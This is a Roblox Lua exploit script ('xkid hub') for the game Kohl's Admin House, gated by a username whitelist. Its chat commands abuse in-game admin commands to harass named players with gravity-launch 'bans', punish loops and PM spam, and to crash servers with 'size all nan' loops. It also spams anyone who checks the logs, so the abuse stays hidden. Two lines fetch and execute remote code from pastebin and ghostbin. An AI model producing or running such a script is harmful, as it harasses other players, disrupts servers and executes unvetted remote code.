

local playexxxr = game:GetService("Players").LocalPlayer

if game:IsLoaded() then
if playexxxr.Name == "The1AndOnlyNoob18" then
elseif playexxxr.Name == "getoutbozoXD" then
    elseif playexxxr.Name == "Astrizon" then
		
		else
        playexxxr:Kick("Not whitelisted! contact xkid if this is mistake")
end
end

local cmds = {
    "x!ban <user>",
    "x!unban <user>",
    "x!autopunish <user>",
    "x!unautopunish <user>",
    "x!unlogspam",
    "x!shutdown",
    "x!serverhop",
    "x!antiabuse",
    "x!unantiabuse",
    "x!destroyobby",
    "x!help"
}
local person = game.Players.LocalPlayer
local someonebanned = false
local someonelogspam = false
local someonepunished = false
local antiabuseon 
local oofgp = game:GetService("Players")
person.Chatted:Connect(function(chat)
local args = string.split(chat, " ")
local command = args[1]
local name = args[2]


if command == "x!help" then
     print("--- XKID HUB CMDS ---")
    for i,v in pairs(cmds) do
        warn(v)
    end
end
-- BAN CMD BAN CMD BAN CMD BAN CMD BAN CMD BAN CMD BAN CMD BAN CMD BAN CMD BAN CMD
 
if command == "x!ban" then
 game.StarterGui:SetCore("SendNotification", {
        Title = "Banned!",
        Text = "Banned player ".. name
})
someonebanned = true

while wait(1) do
if someonebanned == false then break end
game:GetService("Players"):Chat(tostring("setgrav ".. name .. " -9e9"))
game:GetService("Players"):Chat(tostring("pm ".. name .. "" .. math.random(1,100)))

end
end

if command == "x!destroyobby" then
    for i,v in pairs(game.Workspace.Terrain["_Game"].Workspace.Obby:GetChildren()) do
    if v.Name == "Jump" then
        v:Destroy()
    end
end
for i,v in pairs(game.Workspace.Terrain["_Game"].Workspace.Obby:GetChildren()) do
    if v.Name == "Jump1" then
        v:Destroy()
    end
end
for i,v in pairs(game.Workspace.Terrain["_Game"].Workspace.Obby:GetChildren()) do
    if v.Name == "Jump2" then
        v:Destroy()
    end
end
for i,v in pairs(game.Workspace.Terrain["_Game"].Workspace.Obby:GetChildren()) do
    if v.Name == "Jump3" then
        v:Destroy()
    end
end
for i,v in pairs(game.Workspace.Terrain["_Game"].Workspace.Obby:GetChildren()) do
    if v.Name == "Jump4" then
        v:Destroy()
    end
end
for i,v in pairs(game.Workspace.Terrain["_Game"].Workspace.Obby:GetChildren()) do
    if v.Name == "Jump5" then
        v:Destroy()
    end
end
for i,v in pairs(game.Workspace.Terrain["_Game"].Workspace.Obby:GetChildren()) do
    if v.Name == "Jump6" then
        v:Destroy()
    end
end
for i,v in pairs(game.Workspace.Terrain["_Game"].Workspace.Obby:GetChildren()) do
    if v.Name == "Jump7" then
        v:Destroy()
    end
end
for i,v in pairs(game.Workspace.Terrain["_Game"].Workspace.Obby:GetChildren()) do
    if v.Name == "Jump8" then
        v:Destroy()
    end
end
for i,v in pairs(game.Workspace.Terrain["_Game"].Workspace.Obby:GetChildren()) do
    if v.Name == "Jump9" then
        v:Destroy()
    end
end
end

if command == "x!serverhop" then
    
	local x = {}
	for _, v in ipairs(game:GetService("HttpService"):JSONDecode(game:HttpGetAsync("https://games.roblox.com/v1/games/" .. game.PlaceId .. "/servers/Public?sortOrder=Asc&limit=100")).data) do
		if type(v) == "table" and v.maxPlayers > v.playing and v.id ~= game.JobId then
			x[#x + 1] = v.id
		end
	end
	if #x > 0 then
		game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, x[math.random(1, #x)])
	end
end

if command == "x!unlogspam" then
someonelogspam = false

 game.StarterGui:SetCore("SendNotification", {
        Title = "Stopped log spamming",
        Text = "Lmao"
})
end

if command == "x!load" then
loadstring(game:HttpGet('https://pastebin.com/raw/9SPMjxq2', true))()
end


if command == "x!abusershutdown" then
    oofgp:Chat("respawn me")
     oofgp:Chat("ff me")
     oofgp:Chat("gear me 00000000000000000094794847")
    while wait() do
        oofgp:Chat("unpunish me")
        oofgp:Chat("gear me 00000000000000000094794847")
        wait(0.5)
oofgp.LocalPlayer.Character.Humanoid:EquipTool(oofgp.LocalPlayer.Backpack.VampireVanquisher)
wait()
oofgp:Chat("size me .3")
oofgp:Chat("size me .3")
oofgp:Chat("size me .3")
oofgp:Chat("size me .3")
oofgp:Chat("size me .3")
oofgp:Chat("size me .3")
oofgp:Chat("size me .3")
oofgp:Chat("size me .3")
oofgp:Chat("size me .3")
oofgp:Chat("size me .3")
oofgp:Chat("size all nan")
    end
end

if command == "x!shutdown" then

while wait() do
game:GetService("Players"):Chat(tostring("h Shutting down..."))
game:GetService("Players"):Chat("swagify all all all all all all all")

oofgp:Chat("gear me 00000000000000000094794847")
wait(1)
oofgp.LocalPlayer.Character.Humanoid:EquipTool(oofgp.LocalPlayer.Backpack.VampireVanquisher)
wait()
oofgp:Chat("size me .3")
oofgp:Chat("size me .3")
oofgp:Chat("size me .3")
oofgp:Chat("size me .3")
oofgp:Chat("size me .3")
oofgp:Chat("size me .3")
oofgp:Chat("size me .3")
oofgp:Chat("size me .3")
oofgp:Chat("size me .3")
oofgp:Chat("size me .3")
oofgp:Chat("size all nan")
end

end

if command == "x!antiabuse" then
    
end


if command == "x!autopunish" then

 game.StarterGui:SetCore("SendNotification", {
        Title = "Automatically punishing ".. name,
        Text = "Lmao"
})

someonepunished = true

while wait(1) do
if someonepunished == false then break end
game:GetService("Players"):Chat(tostring("punish ".. name))
end

end

if command == "x!unautopunish" then
    someonepunished = false
 game.StarterGui:SetCore("SendNotification", {
        Title = "Stopped punishing ".. name,
        Text = "Lmao"
})
game:GetService("Players"):Chat(tostring("unpunish ".. name))
end
-- UNBAN CMD UNBAN CMD UNBAN CMD UNBAN CMD UNBAN CMD UNBAN CMD UNBAN CMD UNBAN CMD UNBAN CMD 


if command == "x!unban" then

 game.StarterGui:SetCore("SendNotification", {
        Title = "Unbanned!",
        Text = "unbanned ".. name
})
someonebanned = false
game:GetService("Players"):Chat(tostring("respawn ".. name))

end

end)
for _,p in ipairs(game.Players:GetPlayers()) do
print("Anti Chat Log Sucess for user ".. p.Name)
	p.Chatted:Connect(function(msg)
    local args = string.split(msg, " ")
    local e = args[1]
			
if e == ":logs" then

 game.StarterGui:SetCore("SendNotification", {
        Title = "Someone tried using logs!",
        Text = "Spamming player ".. p.Name
})
someonelogspam = true
while wait(0.5) do
if someonelogspam == false then break end
 game:GetService("Players"):Chat(tostring("pm ".. p.Name .. " " .. math.random(1,100)))
end
				
end
			
    if e == "logs" then

 game.StarterGui:SetCore("SendNotification", {
        Title = "Someone tried using logs!",
        Text = "Spamming player ".. p.Name
})
someonelogspam = true
while wait(0.5) do
if someonelogspam == false then break end
 game:GetService("Players"):Chat(tostring("pm ".. p.Name .. " " .. math.random(1,100)))
end




end


end)
end

if syn then
print("Loaded Extra Modules for S^X")
game:GetService("Players").LocalPlayer.OnTeleport:Connect(function(State)
    if State == Enum.TeleportState.Started then
        syn.queue_on_teleport('wait(5) loadstring(game:HttpGet("https://ghostbin.co/paste/66zd9/raw",true))()')
    end
end)
end

 game.StarterGui:SetCore("SendNotification", {
        Title = "Loaded!",
        Text = "Loaded xkids Kohls Admin House Tools."
})

